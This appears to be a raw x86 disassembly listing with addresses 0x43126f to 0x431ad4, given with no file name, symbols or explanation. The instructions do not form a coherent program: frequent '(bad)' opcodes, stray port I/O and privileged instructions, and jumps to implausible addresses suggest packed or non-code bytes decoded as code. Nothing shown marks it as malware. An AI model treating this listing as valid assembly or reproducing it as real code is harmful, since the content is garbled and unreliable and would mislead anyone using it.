  43126f:	fdiv   QWORD PTR ss:[ecx]
  431272:	(bad)  
  431273:	mov    bl,ch
  431275:	add    esi,eax
  431277:	add    dh,bl
  431279:	or     esi,eax
  43127b:	mov    dl,0xdf
  43127d:	add    esi,eax
  43127f:	add    al,ah
  431281:	push   cs
  431282:	mov    BYTE PTR [edx+0xc601e1],0xe2
  431289:	or     BYTE PTR [ebx],dh
  43128b:	dec    ecx
  43128c:	lea    eax,[ebx]
  43128e:	xor    eax,0x18fc0fc7
  431293:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431294:	repz clc 
  431296:	add    eax,DWORD PTR [ebp+0x46]
  431299:	prefetcht0 BYTE PTR [ecx-0x2]
  43129d:	xor    eax,0x7c60872
  4312a2:	mov    esp,0xbd32c69b
  4312a7:	pop    esi
  4312a8:	mov    cl,0xbe
  4312ab:	or     al,0xc6
  4312ad:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  4312b4:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  4312bb:	add    dh,al
  4312bd:	mov    eax,ebx
  4312bf:	xor    DWORD PTR [ebx],0x35008dbc
  4312c5:	mov    ecx,DWORD PTR [edi]
  4312c7:	sbb    al,0x18
  4312c9:	inc    ebp
  4312ca:	xrelease mov DWORD PTR [ebx],0x188546f4
  4312d1:	clc    
  4312d2:	(bad)  
  4312d3:	xor    DWORD PTR [edx-0x64],esi
  4312d6:	lea    ecx,[ecx+0x45ffe838]
  4312dc:	mov    ecx,ebx
  4312de:	fadd   st,st(6)
  4312e0:	dec    ebp
  4312e1:	lds    edi,FWORD PTR [eax+0x7145fc56]
  4312e7:	out    0x1,eax
  4312e9:	inc    ebp
  4312ea:	lea    ebp,ds:0xc8ffc6ff
  4312f0:	enter  0xa33,0xc6
  4312f4:	push   ebp
  4312f5:	leave  
  4312f6:	(bad)  
  4312f7:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  4312fd:	add    BYTE PTR [ebp+0x44],al
  431300:	mov    eax,esp
  431302:	mov    WORD PTR [esi+0x46398300],?
  431308:	psubusw mm4,QWORD PTR [esi-0x78]
  43130c:	add    BYTE PTR [ebx-0x1303f975],al
  431312:	add    BYTE PTR [ebp+0x1],0xeb
  431316:	add    BYTE PTR [ebp+0x38],al
  431319:	in     eax,dx
  43131a:	inc    ebp
  43131b:	inc    ebp
  43131c:	mov    ebx,ebx
  43131e:	add    BYTE PTR [ebp+0x0],0xec
  431322:	mov    DWORD PTR [ebp-0x41],eax
  431325:	sub    eax,0x2c00454e
  43132a:	ins    DWORD PTR es:[edi],dx
  43132b:	inc    ebp
  43132c:	add    BYTE PTR [esi+0x66],bh
  43132f:	test   BYTE PTR [ebp-0x2300bc],0xb6
  431336:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  431340:	dec    edi
  431341:	pop    es
  431342:	add    ah,ch
  431344:	mov    DWORD PTR [ebp+0x68],eax
  431347:	in     eax,dx
  431348:	inc    DWORD PTR [ebp-0x7d]
  43134b:	out    0xc0,al
  43134d:	inc    ebp
  43134e:	mov    edx,esp
  431350:	push   0x45
  431352:	(bad)  
  431353:	jmp    0xdf925910
  431358:	add    BYTE PTR [ebp-0x77],al
  43135b:	out    dx,al
  43135c:	ins    BYTE PTR es:[edi],dx
  43135d:	inc    ebp
  43135e:	jmp    edi
  431360:	add    DWORD PTR [ebp-0x14],0x7e
  431364:	mov    esi,esi
  431366:	outs   dx,BYTE PTR ds:[esi]
  431367:	inc    esp
  431368:	(bad)  
  431369:	mov    esp,0x8341b68d
  43136e:	mov    DWORD PTR [esi+0x70],eax
  431371:	fcos   
  431373:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  431379:	in     al,dx
  43137a:	jb     0x431301
  43137c:	(bad)  
  43137d:	dec    DWORD PTR [ebx-0x7aba9901]
  431383:	mov    edi,edi
  431385:	fdivr  st,st(7)
  431387:	out    dx,eax
  431388:	rcl    BYTE PTR [ebx],0x66
  43138b:	mov    DWORD PTR [ebp-0xc70075],eax
  431391:	(bad)  
  431392:	std    
  431393:	cmp    eax,DWORD PTR [eax]
  431395:	jne    0x4313fd
  431397:	mov    DWORD PTR [ebp-0xba0048],eax
  43139d:	in     al,dx
  43139e:	outs   dx,BYTE PTR ds:[esi]
  43139f:	pushf  
  4313a0:	add    BYTE PTR [ebx-0x7f7a039a],cl
  4313a6:	inc    DWORD PTR [ecx]
  4313a8:	inc    DWORD PTR [eax]
  4313aa:	jae    0x4313e4
  4313ac:	add    BYTE PTR [ebp+0x850266],al
  4313b2:	inc    DWORD PTR [ebp-0x1]
  4313b5:	mov    eax,eax
  4313b7:	jl     0x43141f
  4313b9:	add    BYTE PTR [ebp-0x740077],al
  4313bf:	cld    
  4313c0:	dec    eax
  4313c1:	add    BYTE PTR [eax],0x1
  4313c4:	data16 add BYTE PTR [ebp+0x38],al
  4313c8:	mov    eax,0x47c2
  4313cd:	mov    eax,0x824f89
  4313d2:	inc    edi
  4313d3:	mov    DWORD PTR [edx+0x64],ebp
  4313d6:	inc    WORD PTR [ebp-0x75]
  4313da:	(bad)  
  4313db:	data16 rol BYTE PTR [ebp-0x16001a],1
  4313e2:	inc    ebp
  4313e3:	jge    0x4313c4
  4313e5:	add    bh,ah
  4313e7:	lea    ax,[ebp-0x750030]
  4313ee:	add    al,0x46
  4313f1:	jmp    0x40ff:0x8885
  4313f7:	push   DWORD PTR [ebp+0x52]
  4313fa:	lea    eax,[eax]
  4313fc:	shl    BYTE PTR [esi-0x7b],1
  4313ff:	test   esi,edi
  431401:	(bad)  
  431402:	(bad)  
  431403:	inc    DWORD PTR [ebp-0x990140]
  431409:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  43140f:	inc    edi
  431410:	push   ecx
  431411:	xor    ax,WORD PTR [ebp-0x8d0045]
  431418:	add    al,al
  43141a:	ret    
  43141b:	mov    ax,WORD PTR [ebp-0x3f0004]
  431422:	push   eax
  431423:	mov    DWORD PTR [ebp-0x77],0xff98748b
  43142a:	add    BYTE PTR [ebx-0x764f8839],al
  431430:	push   DWORD PTR [esi+0x1]
  431433:	inc    DWORD PTR [eax]
  431435:	mov    eax,0xff99ff
  43143a:	or     BYTE PTR [ecx-0x7a87bb],cl
  431440:	jne    0x4313fa
  431442:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  43144c:	mov    ecx,0xd74fb8
  431451:	add    cl,al
  431453:	mov    DWORD PTR [ecx-0x3f007784],ecx
  431459:	or     DWORD PTR [ebx+0x558966dc],0x7e
  431460:	(bad)  
  431461:	push   ebp
  431463:	mov    eax,0x8c2789
  431468:	ret    0x6689
  43146b:	adc    BYTE PTR [ebp+0x48],0x8d
  43146f:	add    bh,ah
  431471:	mov    WORD PTR [ebp-0x70],ax
  431475:	(bad)  
  431476:	ret    0x667d
  431479:	or     BYTE PTR [ebp-0x77],dl
  43147c:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431483:	loop   0x43140e
  431485:	(bad)  
  431486:	xchg   esi,eax
  431487:	aam    0xcf
  431489:	out    dx,al
  43148a:	mov    DWORD PTR [esi-0x68],edi
  43148d:	inc    ebp
  43148e:	dec    edx
  43148f:	pop    ecx
  431490:	mov    edx,DWORD PTR [eax]
  431492:	repnz push bp
  431495:	or     BYTE PTR [ebx+0x55106638],0x49
  43149c:	(bad)  
  43149d:	repnz xor eax,0xa0898945
  4314a3:	mov    ah,0x89
  4314a5:	jmp    DWORD PTR [edx+0x66b0418d]
  4314ab:	inc    DWORD PTR [ebp+0x50]
  4314ae:	add    DWORD PTR [ebp-0x5],0xffffffbe
  4314b2:	mov    DWORD PTR [eax],ecx
  4314b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4314b5:	pop    es
  4314b6:	inc    ecx
  4314b7:	(bad)  
  4314b8:	data16 fwait
  4314ba:	inc    ebp
  4314bb:	xor    ah,BYTE PTR [esi+0x3]
  4314be:	dec    ebp
  4314bf:	push   eax
  4314c0:	inc    bp
  4314c2:	jge    0x431447
  4314c4:	mov    esp,DWORD PTR [esi-0x18]
  4314c7:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  4314cd:	add    DWORD PTR [ebx],esi
  4314cf:	add    BYTE PTR [ebx],al
  4314d1:	test   DWORD PTR [ebx],esi
  4314d3:	(bad)  
  4314d4:	inc    WORD PTR [ebp+0x0]
  4314d8:	mov    eax,DWORD PTR [eax]
  4314da:	call   0x8898cc0f
  4314df:	mov    esi,eax
  4314e1:	clc    
  4314e2:	ret    
  4314e3:	rol    cl,0xa
  4314e6:	mov    DWORD PTR ds:0x7c0ec88,esi
  4314ec:	mov    edx,edi
  4314ee:	pushf  
  4314ef:	pop    es
  4314f0:	jmp    FWORD PTR [edx+0x66]
  4314f3:	add    BYTE PTR [ebp-0x990175],al
  4314f9:	inc    ebp
  4314fa:	test   DWORD PTR [ebx-0x2f00f202],eax
  431500:	push   ebp
  431501:	mov    edi,eax
  431503:	mov    dh,BYTE PTR [eax+0x266ff51]
  431509:	push   ebp
  43150a:	add    BYTE PTR [ebx-0x764b0777],al
  431510:	dec    DWORD PTR [esi+0x661851e8]
  431516:	add    BYTE PTR [ebp-0x7b],dl
  431519:	cmp    esi,0xfffffffb
  43151c:	dec    DWORD PTR [ecx+0x51fe9285]
  431522:	jmp    DWORD PTR [esi-0x75]
  431525:	push   ebp
  431526:	hlt    
  431527:	data16 (bad) 
  431529:	dec    ebp
  43152a:	ret    
  43152b:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  431531:	lea    edx,[eax-0x1]
  431534:	jne    0x431507
  431536:	dec    DWORD PTR [ecx-0x2f7a63f8]
  43153c:	dec    BYTE PTR [ecx+0x51559eff]
  431542:	mov    DWORD PTR [esi-0x4c],esp
  431545:	push   ebp
  431546:	jmp    DWORD PTR [esi-0x18]
  431549:	inc    ebp
  43154a:	sbb    BYTE PTR [ebp-0x767ad900],cl
  431550:	(bad)  
  431551:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431552:	inc    eax
  431554:	test   DWORD PTR [esi-0x2],esp
  431557:	inc    ebp
  431558:	dec    DWORD PTR [ebp-0x760bde75]
  43155e:	(bad)  
  43155f:	test   al,0xc3
  431561:	mov    DWORD PTR [ebp-0x769b56],ecx
  431567:	lods   al,BYTE PTR ds:[esi]
  431568:	push   eax
  431569:	inc    ebp
  43156a:	jne    0x43157b
  43156c:	dec    DWORD PTR [ebp+0x8]
  43156f:	mov    ecx,DWORD PTR [ebx]
  431571:	sbb    al,0x0
  431573:	(bad)  
  431574:	mov    eax,0xc14fc3
  431579:	mov    DWORD PTR [ecx-0xbabf64],ecx
  43157f:	movsx  ecx,WORD PTR [ebp+0x4e]
  431583:	xor    eax,DWORD PTR [eax]
  431585:	add    eax,edi
  431587:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  43158d:	xor    edi,DWORD PTR [eax+0x854f66]
  431593:	dec    BYTE PTR [ecx-0x76bb01]
  431599:	mov    BYTE PTR [ebx-0x76724001],al
  43159f:	pushf  
  4315a0:	inc    esi
  4315a1:	(bad)  
  4315a2:	dec    DWORD PTR [ebp-0x7abe6373]
  4315a8:	sar    esi,0x89
  4315ab:	dec    DWORD PTR [eax+0x0]
  4315ae:	inc    DWORD PTR [eax]
  4315b0:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  4315b7:	xlat   BYTE PTR ds:[ebx]
  4315b8:	dec    edx
  4315b9:	add    bh,bh
  4315bb:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  4315c1:	lea    esp,[esi-0x50]
  4315c4:	(bad)  
  4315c5:	(bad)  
  4315c6:	call   DWORD PTR [eax-0x1]
  4315c9:	inc    ebp
  4315ca:	rdpmc  
  4315cc:	add    BYTE PTR [ebx],al
  4315ce:	push   ax
  4315d0:	lea    eax,[ebp-0x1]
  4315d6:	js     0x4315d7
  4315d8:	add    al,bh
  4315da:	push   bp
  4315dc:	lea    ecx,[ebp-0x7701]
  4315e2:	fmul   DWORD PTR [ebp-0x7a997800]
  4315e8:	(bad)  
  4315e9:	(bad)  
  4315ea:	(bad)  
  4315eb:	(bad)  
  4315ec:	jmp    DWORD PTR [ecx-0x7676ffb3]
  4315f2:	dec    eax
  4315f3:	mov    eax,0x8d8dffff
  4315f8:	mov    al,0xb0
  4315fa:	(bad)  
  4315fb:	call   DWORD PTR [ecx+0x50]
  4315fe:	dec    ebp
  4315ff:	inc    ebp
  431600:	mov    esi,0x7030833
  431605:	push   eax
  431606:	into   
  431607:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  43160d:	call   DWORD PTR [ecx-0x8]
  431610:	lea    edx,[ebp-0x1]
  431613:	jmp    0x761817
  431618:	inc    eax
  431619:	jnp    0x4315a8
  43161b:	add    dh,bh
  43161d:	inc    WORD PTR [ebp-0x8a00b0]
  431624:	mov    edx,eax
  431626:	inc    esp
  431627:	add    bh,bh
  431629:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  43162f:	dec    DWORD PTR [ebx-0x7f820301]
  431635:	add    BYTE PTR [ecx],al
  431637:	data16 add BYTE PTR [ebp-0xb30077],al
  43163e:	inc    eax
  431640:	(bad)  
  431641:	dec    si
  431643:	test   edi,edi
  431645:	(bad)  
  431646:	cmp    edi,edi
  431648:	add    ecx,DWORD PTR [edi-0x39]
  43164b:	mov    edx,DWORD PTR [edx+0x66]
  43164e:	inc    DWORD PTR [ebp-0x3d00cb]
  431654:	mov    eax,0x66ff8b5e
  43165a:	jmp    0xb4ff:0xc7ff3895
  431661:	push   ecx
  431662:	inc    DWORD PTR [ebx-0x76ffccbb]
  431668:	call   DWORD PTR [esi-0x1]
  43166b:	dec    DWORD PTR [eax]
  43166d:	mov    ecx,0x805ff
  431672:	inc    ebp
  431673:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  431679:	mov    ecx,0x35784
  43167e:	add    BYTE PTR [ecx-0xffa59b],cl
  431684:	inc    ebp
  431685:	mov    ecx,0x9c6131
  43168a:	(bad)  
  43168b:	mov    eax,ebx
  43168d:	pop    esp
  43168e:	test   edi,edi
  431690:	clc    
  431691:	lea    eax,[ebp-0x24]
  431694:	cmp    eax,0xc7fe9c8d
  431699:	push   eax
  43169b:	lea    eax,[ebp+0x45fff8fe]
  4316a1:	mov    esi,DWORD PTR [ecx]
  4316a3:	hlt    
  4316a4:	lahf   
  4316a5:	push   esp
  4316a6:	mov    edx,DWORD PTR [ecx-0x4]
  4316a9:	xor    eax,DWORD PTR [eax+0x7201bb]
  4316af:	add    BYTE PTR [ebp-0x35],al
  4316b2:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  4316b8:	mov    edx,DWORD PTR [ecx-0x74]
  4316bb:	rol    BYTE PTR [eax],0x8d
  4316be:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  4316c2:	nop
  4316c3:	push   ecx
  4316c4:	add    bh,bh
  4316c6:	mov    esp,edi
  4316c8:	in     al,0x85
  4316ca:	jge    0x4316ca
  4316cc:	test   edi,edi
  4316ce:	jne    0x431655
  4316d0:	(bad)  
  4316d1:	(bad)  
  4316d2:	sbb    bh,bh
  4316d4:	push   ebp
  4316d5:	inc    ebp
  4316d6:	call   0xffdc1166
  4316db:	add    BYTE PTR [ebp+0x66],al
  4316de:	mov    edx,DWORD PTR [ebp-0xfc0075]
  4316e4:	cmp    al,0x85
  4316e6:	ud0    eax,DWORD PTR [ebp-0x1]
  4316ea:	test   DWORD PTR [edi+0x74],ecx
  4316ed:	dec    edi
  4316ee:	inc    DWORD PTR [ebp-0x530004]
  4316f4:	dec    DWORD PTR [edi-0x75]
  4316f7:	dec    esi
  4316f8:	cld    
  4316f9:	test   DWORD PTR [eax+0xff01ff],eax
  4316ff:	icebp  
  431700:	add    BYTE PTR [edi-0x3a],cl
  431703:	test   ebx,eax
  431705:	inc    BYTE PTR [ebp-0x1]
  431708:	jne    0x43170a
  43170a:	mov    eax,DWORD PTR [eax]
  43170c:	cld    
  43170d:	xor    BYTE PTR [ecx+0x500155],cl
  431713:	push   ebp
  431714:	xor    DWORD PTR [ecx+0x45011c80],ecx
  43171a:	add    BYTE PTR [ebp+0x35e90f50],al
  431720:	add    al,BYTE PTR [eax]
  431722:	add    BYTE PTR [ebx-0x38fe4f80],al
  431728:	add    ah,ch
  43172a:	or     BYTE PTR [ebp+0x4501f845],dh
  431730:	jmp    0xdf1a26
  431735:	(bad)  
  431736:	nop    ecx
  431739:	test   DWORD PTR [ebp+0x4502f8],eax
  43173f:	xor    ecx,DWORD PTR [ebp-0x64]
  431742:	mov    eax,edi
  431744:	mov    ebx,DWORD PTR [eax+edx*2]
  431747:	add    eax,0x45fef885
  43174c:	dec    DWORD PTR [ebx+0x339445]
  431752:	add    ecx,DWORD PTR [ecx+0x4500f889]
  431758:	dec    DWORD PTR [ebx-0x460f0375]
  43175e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43175f:	add    esi,edi
  431761:	add    bh,bh
  431763:	rdpmc  
  431765:	add    BYTE PTR [ebx],0x1
  431768:	mov    DWORD PTR [eax],eax
  43176a:	add    al,0x45
  43176c:	dec    DWORD PTR [ecx-0x360b3373]
  431772:	dec    DWORD PTR [esi]
  431774:	push   eax
  431775:	jne    0x4317bc
  431777:	mov    esi,DWORD PTR [ebx]
  431779:	cld    
  43177a:	add    esp,ecx
  43177c:	push   eax
  43177d:	inc    DWORD PTR [ebp-0x75]
  431780:	add    eax,0x800e4
  431785:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43178b:	mov    DWORD PTR [ecx],eax
  43178d:	sbb    al,0x0
  43178f:	leave  
  431790:	test   DWORD PTR [edi-0x2],eax
  431793:	jne    0x431794
  431795:	call   0xff44019a
  43179a:	xor    BYTE PTR [ebp+0x4d],al
  43179d:	mov    edi,edi
  43179f:	enter  0x8,0x4d
  4317a3:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  4317a9:	mov    eax,DWORD PTR [eax]
  4317ab:	cld    
  4317ac:	add    DWORD PTR [ecx],ebx
  4317ae:	inc    ebp
  4317af:	dec    ebp
  4317b0:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  4317b6:	inc    eax
  4317b7:	dec    DWORD PTR [ecx-0x270375]
  4317bd:	add    BYTE PTR [ebx-0x39d72701],cl
  4317c3:	xchg   ecx,eax
  4317c4:	ret    
  4317c5:	add    BYTE PTR [ebp-0x830075],al
  4317cb:	add    BYTE PTR [ebp-0x75],al
  4317ce:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  4317d4:	lea    edi,[edi-0xc]
  4317d7:	add    bh,bh
  4317d9:	mov    edx,DWORD PTR [eax-0x7b]
  4317dc:	inc    ebp
  4317dd:	rdpmc  
  4317df:	jne    0x4317e4
  4317e1:	add    BYTE PTR [eax-0x75],dl
  4317e4:	inc    ebp
  4317e5:	clc    
  4317e6:	add    eax,0x400009
  4317eb:	mov    DWORD PTR [ebx-0x7f000304],ecx
  4317f1:	mov    eax,DWORD PTR [ecx]
  4317f3:	in     al,dx
  4317f4:	add    dh,al
  4317f6:	test   ebx,eax
  4317f8:	inc    BYTE PTR [ebp-0xff0001]
  4317fe:	add    BYTE PTR [ebp-0x43],al
  431801:	cmp    esi,0xfffffff8
  431804:	(bad)  
  431805:	push   DWORD PTR [eax]
  431807:	add    BYTE PTR [ebp-0x3a],dl
  43180a:	test   ebx,eax
  43180c:	je     0x431793
  43180e:	mov    edi,edi
  431810:	sbb    al,0xff
  431812:	test   DWORD PTR gs:[eax],eax
  431815:	(bad)  
  431816:	js     0x431817
  431818:	add    BYTE PTR [ebx-0x39b20bdd],cl
  43181e:	sub    eax,ebx
  431820:	mov    ecx,DWORD PTR [ebx-0x55130377]
  431826:	add    eax,DWORD PTR [eax]
  431828:	dec    ebp
  431829:	push   eax
  43182a:	mov    al,BYTE PTR [ebp+0x1]
  43182d:	mov    eax,DWORD PTR [ebp-0x68]
  431830:	mov    eax,DWORD PTR [eax]
  431832:	sbb    bh,al
  431834:	or     ah,dh
  431836:	dec    ebp
  431837:	inc    DWORD PTR [eax+0x4]
  43183a:	push   ecx
  43183b:	add    BYTE PTR [edx-0x1],dh
  43183e:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  431844:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  43184e:	add    ecx,DWORD PTR [ecx-0x1be77477]
  431854:	push   ecx
  431855:	cmp    BYTE PTR [ebx],al
  431857:	inc    ebp
  431858:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  43185e:	(bad)  
  43185f:	(bad)  
  431860:	in     al,0xff
  431862:	add    BYTE PTR [ebp+0x0],al
  431865:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  43186b:	add    al,bh
  43186d:	(bad)  
  43186e:	jmp    0x8d85:0x74b0558d
  431875:	dec    DWORD PTR [eax]
  431877:	call   DWORD PTR [ebp-0x7b]
  43187a:	mov    edi,esi
  43187c:	lock call DWORD PTR [ebp-0x75]
  431880:	mov    esi,esp
  431882:	mov    ah,0xc6
  431884:	mov    bh,0xc3
  431886:	mov    DWORD PTR [ebx-0x110003c4],ecx
  43188c:	add    DWORD PTR [eax],0x450050ff
  431892:	mov    DWORD PTR [ebx+0x9598cc],ecx
  431898:	inc    edi
  43189a:	push   esp
  43189c:	jmp    0xcd00:0x650481ff
  4318a3:	mov    DWORD PTR [ebx],esi
  4318a5:	clc    
  4318a6:	cmp    edi,0xff9cff3c
  4318ac:	jne    0x4318b6
  4318ae:	mov    eax,eax
  4318b0:	add    esi,DWORD PTR [eax]
  4318b2:	int3   
  4318b3:	inc    ebp
  4318b4:	cmp    al,0x83
  4318b6:	add    BYTE PTR [eax],bl
  4318b8:	adc    DWORD PTR [ebx+0x768b5055],eax
  4318be:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  4318c4:	mov    edi,eax
  4318c6:	cmp    BYTE PTR [ebp+0x45],cl
  4318c9:	jmp    0x431856
  4318cb:	mov    ebx,DWORD PTR [esp+ebp*8]
  4318ce:	inc    ebp
  4318cf:	or     al,0x2
  4318d1:	dec    DWORD PTR [ebp+0x18]
  4318d4:	jne    0x43192b
  4318d6:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  4318dc:	mov    edi,DWORD PTR [ebx]
  4318de:	in     al,0x50
  4318e0:	xchg   ecx,eax
  4318e1:	jmp    0x34367e6
  4318e6:	adc    al,0x8b
  4318e8:	inc    ebp
  4318e9:	mov    al,ds:0x8b04008b
  4318ee:	push   ebp
  4318ef:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  4318f5:	push   ebp
  4318f6:	test   DWORD PTR [ebx-0x2800d701],ecx
  4318fc:	inc    ebp
  4318fd:	dec    ebp
  4318fe:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431904:	mov    DWORD PTR [eax],0xe9ff00f4
  43190a:	add    al,0x0
  43190c:	add    BYTE PTR [eax],al
  43190e:	mov    eax,edx
  431910:	push   eax
  431911:	rol    DWORD PTR [ebp-0xf0177],1
  431917:	bound  eax,QWORD PTR [ebp+0x50]
  43191a:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  431920:	add    BYTE PTR [ecx+0x558df0ff],cl
  431926:	mov    al,0xf
  431928:	test   DWORD PTR [edx],edx
  43192a:	call   DWORD PTR [ebp-0x7a0001]
  431930:	(bad)  
  431931:	loop   0x431932
  431933:	jnp    0xc6990d39
  431939:	mov    eax,ebx
  43193b:	cmp    al,0x8b
  43193d:	(bad)  
  43193e:	cld    
  43193f:	shr    esi,0xc
  431942:	add    dl,al
  431944:	push   eax
  431945:	lea    eax,[ebp-0x1]
  431948:	mov    edx,esi
  43194a:	cwde   
  43194b:	cli    
  43194c:	add    BYTE PTR [ebp+0x1ffff8ff],al
  431952:	or     BYTE PTR [eax],cl
  431954:	inc    ebp
  431955:	dec    ebp
  431956:	inc    DWORD PTR [ebx+0x74803914]
  43195c:	add    DWORD PTR [ebx+0x451800],ecx
  431962:	call   DWORD PTR [eax+edx*1]
  431965:	add    ecx,DWORD PTR [ebp-0x34]
  431968:	push   edi
  431969:	adc    al,0x8
  43196b:	mov    edx,DWORD PTR [ebp-0x14]
  43196e:	mov    ecx,DWORD PTR [ebp+0x18]
  431971:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  431975:	inc    DWORD PTR [eax+esi*8]
  431978:	inc    ebp
  431979:	stos   BYTE PTR es:[edi],al
  43197a:	mov    edx,DWORD PTR [ebp-0x4]
  43197d:	add    DWORD PTR [ebp-0x1c],eax
  431980:	mov    edx,DWORD PTR [ebp-0x70]
  431983:	cmp    eax,DWORD PTR [eax]
  431985:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431986:	mov    eax,DWORD PTR [eax]
  431988:	cld    
  431989:	jae    0x43190b
  43198b:	add    eax,DWORD PTR [ecx]
  43198d:	clc    
  43198e:	add    BYTE PTR [eax+0x30],dl
  431991:	mov    DWORD PTR [ecx],esi
  431993:	clc    
  431994:	pop    ds
  431995:	inc    ebp
  431996:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  43199c:	(bad)  
  43199d:	push   DWORD PTR [edi]
  43199f:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  4319a5:	(bad)  
  4319a6:	jae    0x4319a7
  4319a8:	mov    eax,DWORD PTR [ebp-0x740175]
  4319ae:	sub    eax,DWORD PTR [eax]
  4319b0:	add    eax,DWORD PTR [eax]
  4319b2:	mov    DWORD PTR [ecx+0x5f],eax
  4319b5:	mov    DWORD PTR [ebx-0x4],ebx
  4319b8:	ret    0xff
  4319bb:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  4319c1:	ret    
  4319c2:	mov    eax,DWORD PTR [ebp-0x6f0075]
  4319c8:	add    BYTE PTR [ebp-0x7d],al
  4319cb:	mov    DWORD PTR [eax],eax
  4319cd:	add    al,0x84
  4319cf:	inc    DWORD PTR [ecx]
  4319d1:	lea    eax,[eax]
  4319d3:	hlt    
  4319d4:	sar    bh,cl
  4319d6:	test   BYTE PTR [eax+0x1],dl
  4319d9:	inc    ebp
  4319da:	add    BYTE PTR [ebx],dh
  4319dc:	test   BYTE PTR [ebx],0x84
  4319df:	push   eax
  4319e0:	add    BYTE PTR [ebp+0x0],al
  4319e3:	add    eax,0x86
  4319e8:	add    BYTE PTR [ebx-0x7f7b0340],cl
  4319ee:	add    BYTE PTR [ecx],al
  4319f0:	add    BYTE PTR [eax],al
  4319f2:	mov    esi,0x550030
  4319f7:	mov    ecx,DWORD PTR [edi]
  4319f9:	cld    
  4319fa:	fidiv  DWORD PTR [ebp+0x0]
  4319fd:	mov    edi,DWORD PTR [ecx]
  4319ff:	xor    BYTE PTR [eax+eax*1],0x84
  431a03:	add    eax,DWORD PTR [eax]
  431a05:	sbb    BYTE PTR [eax],al
  431a07:	jne    0x4319ba
  431a09:	mov    eax,DWORD PTR [ecx]
  431a0b:	sbb    BYTE PTR [eax],al
  431a0d:	mov    DWORD PTR [ebp-0x1],esp
  431a10:	add    BYTE PTR [eax+0x30e45ca],bh
  431a16:	ret    0xb7fc
  431a19:	dec    ebp
  431a1a:	or     al,0x89
  431a1c:	dec    ebp
  431a1d:	cld    
  431a1e:	cmovne ecx,DWORD PTR [eax-0x75]
  431a22:	add    edi,esp
  431a24:	seto   BYTE PTR [esi-0x72ffffff]
  431a2b:	inc    ebp
  431a2c:	adc    al,0x8b
  431a2e:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  431a35:	cmp    DWORD PTR [edi+0x72],edx
  431a38:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  431a3e:	gs cmp al,0x0
  431a41:	je     0x431a19
  431a43:	push   eax
  431a44:	sar    BYTE PTR [eax],1
  431a46:	mov    bh,0x3e
  431a48:	push   cs
  431a49:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  431a4f:	add    DWORD PTR [ecx+0x12],ebp
  431a52:	dec    edx
  431a53:	(bad)  
  431a54:	mov    eax,edx
  431a56:	in     al,dx
  431a57:	adc    DWORD PTR [ecx],esi
  431a59:	pop    esi
  431a5a:	inc    ecx
  431a5b:	leave  
  431a5c:	or     DWORD PTR [eax],ebx
  431a5e:	gs push ebp
  431a60:	add    ah,ch
  431a62:	into   
  431a63:	in     al,dx
  431a64:	enter  0xb756,0xf0
  431a68:	push   cs
  431a69:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  431a73:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  431a79:	jnp    0x74439f81
  431a7f:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431a85:	add    BYTE PTR [edi],cl
  431a87:	mov    edi,DWORD PTR [ecx-0x78]
  431a8a:	ltr    WORD PTR [ecx-0x7b]
  431a8e:	dec    DWORD PTR [edi]
  431a90:	clc    
  431a91:	out    0x45,eax
  431a93:	add    BYTE PTR [eax],cl
  431a95:	cmp    ebx,0xffffff8c
  431a98:	jge    0x431a9a
  431a9a:	jb     0x431aac
  431a9c:	je     0x521b1c
  431aa2:	pop    edx
  431aa3:	push   esi
  431aa4:	mov    ecx,DWORD PTR [edi]
  431aa6:	in     al,dx
  431aa7:	rol    DWORD PTR [ebp+0x0],1
  431aaa:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431ab1:	cmp    DWORD PTR [ecx],0xfffffff0
  431ab4:	hlt    
  431ab5:	mov    esp,DWORD PTR [eax+0xf034d2b]
  431abb:	(bad)  
  431abd:	push   eax
  431abe:	jns    0xb842ff3c
  431ac4:	lock push cs
  431ac6:	ror    edx,0x3
  431ac9:	test   BYTE PTR [ecx+0x5500e800],cl
  431acf:	dec    eax
  431ad0:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431ad4:	(bad)  
